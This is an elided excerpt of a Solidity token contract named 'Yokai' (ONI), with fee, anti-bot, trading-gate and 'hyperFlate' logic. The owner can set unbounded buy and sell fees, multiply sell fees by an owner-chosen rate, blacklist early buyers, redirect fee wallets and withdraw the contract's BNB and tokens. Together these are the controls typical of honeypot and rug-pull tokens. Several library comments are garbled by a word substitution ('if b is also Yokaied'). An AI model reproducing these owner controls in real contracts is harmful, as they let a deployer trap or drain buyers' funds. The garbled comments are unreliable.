...
library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also Yokaied.
...
abstract contract Context {
	 ...
	 * This allows applications to reconstruct the allowance for all Yokai just
	...
	contract Yokai is ERC20, Ownable {
        ...
        address payable public marketingFeeReceiver = payable(0x5cB92E45d568957efF05A111863ED48122c49a0F); 
		address payable public devFeeReceiver = payable(0xA78c4351582b0c32843DAcC142A2D94376b41618);
		address payable public hyperFlate = payable(0xe4fa147Ad1dfa1106fD876Bf93075e7221666723); 
		...
		uint256 public hyperFlateRateIncrease = 0;
		...
		mapping (address => bool) private _isMaxWalletLimit;
		mapping (address => bool) private _isExcludedFromFees;
		mapping (address => bool) private canTransferBeforeTradingEnabled;


		bool public tradingOpen = false;
		bool public hyperFlateEnabled = false;
		bool private antiBotMode = false;
		uint256 private _swapThreshold = 200000 * (10**9);
		uint256 private _hyperFlateThreshold = 100000000000 * (10**18); 
		...
		event excludeMultipleAccountFromRewards(address[] Yokai, bool isExcluded);
		...
		constructor() ERC20("Yokai", "ONI"){
			uint256 _liquidityFee = 2;
			uint256 _marketingFee = 5;
			uint256 _devFee = 1;
			uint256 _hyperFlateFee = 4;
			...
			devFee = _devFee;
			hyperFlateFee = _hyperFlateFee;
		
			
			
			totalFee =  _liquidityFee + _marketingFee + _devFee + _hyperFlateFee;
		...
		function setIsFeeExempt(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "Yokai: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function setIsTxLimitExempt(address account, bool excluded) public onlyOwner {
			require(_isTxLimit[account] != excluded, "Yokai: Account is already the value of 'excluded'");
			_isTxLimit[account] = excluded;

		}
		  function setIsMaxWalletExempt(address account, bool excluded) public onlyOwner {
			require(_isMaxWalletLimit[account] != excluded, "Yokai: Account is already the value of 'excluded'");
			_isMaxWalletLimit[account] = excluded;
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "Yokai: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "Yokai: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "Yokai: The liquidity wallet is already this address");
		...
		function setDistributorSettings(uint256 gas) public onlyOwner {
			require(gas >= 200000 && gas <= 500000, "Yokai: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "Yokai: Cannot update distributorGas to same value");
			emit GasForProcessingUpdated(gas, distributorGas);
			distributorGas = gas;
		}
		
		function setFeeReceiver(address payable _marketingFeeReceiver, address payable _devFeeReceiver) external onlyOwner() {
            marketingFeeReceiver = _marketingFeeReceiver;
			devFeeReceiver = _devFeeReceiver;

		}
		function changeHyperFlateAddress(address payable _hyperFlateAddress) external onlyOwner() {
            hyperFlate = _hyperFlateAddress;
		...
		function setFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee, uint256 _hyperFlateFee) external onlyOwner {
			marketingFee = _marketingFee;
			liquidityFee = _liquidityFee;
			devFee = _devFee;
			hyperFlateFee = _hyperFlateFee;
		...
		function setHyperFlate(bool _enabled, uint256 _Threshold) public onlyOwner {
			hyperFlateEnabled = _enabled;
			_hyperFlateThreshold = _Threshold * 10**18 ;
		
		}
		
		function IncreaseHyperFlateRatePercent (uint256 _Percent) public onlyOwner {
			hyperFlateRateIncrease = _Percent;
		
		}
		
		function setAntiBotmode(bool _status, uint256 _deadBlocks) external onlyOwner() {
			antiBotMode	=	_status;
		...
		function setSwapThreshold(uint256 newSwapThreshold) external onlyOwner() {
			_swapThreshold = newSwapThreshold * 10**18 ;
			
		}
		
        function manualSend(address addr, uint256 amount) external onlyOwner()  {
			IERC20 token = IERC20(addr);
			uint256 balance = token.balanceOf(address(this));
			require(balance >= amount, "Not Enough Tokens in contract to Send");

			if(amount > 0)
            token.transfer(msg.sender, amount);
		}
			
		function withdrawLeftOverBNB(uint256 Amount) external onlyOwner() {
			uint256 amountBNB = address(this).balance;
			payable(msg.sender).transfer(amountBNB * Amount / 100);
		}

        function withdrawStuckToken(uint256 amount) external onlyOwner {
			_withdrawStuckToken(msg.sender, amount);

        }
	
        function _withdrawStuckToken(address account, uint256 amount) internal virtual {
            require(account != address(0), "Must be Owner Address");
		...
		function _transfer(
			...
			//antibot - first 2 blocks will be Blacklist
			...
			if(!tradingOpen) {
				require(canTransferBeforeTradingEnabled[from], "Yokai: This account cannot send tokens until trading is enabled");
			}
			...
			if( 
				...
				require(amount <= _hyperFlateThreshold, "HyperFlate Maximum Rate");
			}
			...
			if(takeFee) {
				...
				// HYPERFLATE will be manually or automatically triggered to buy 1 to 3 times a 33% of the max wallet
				
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(hyperFlateRateIncrease).div(100);
				}
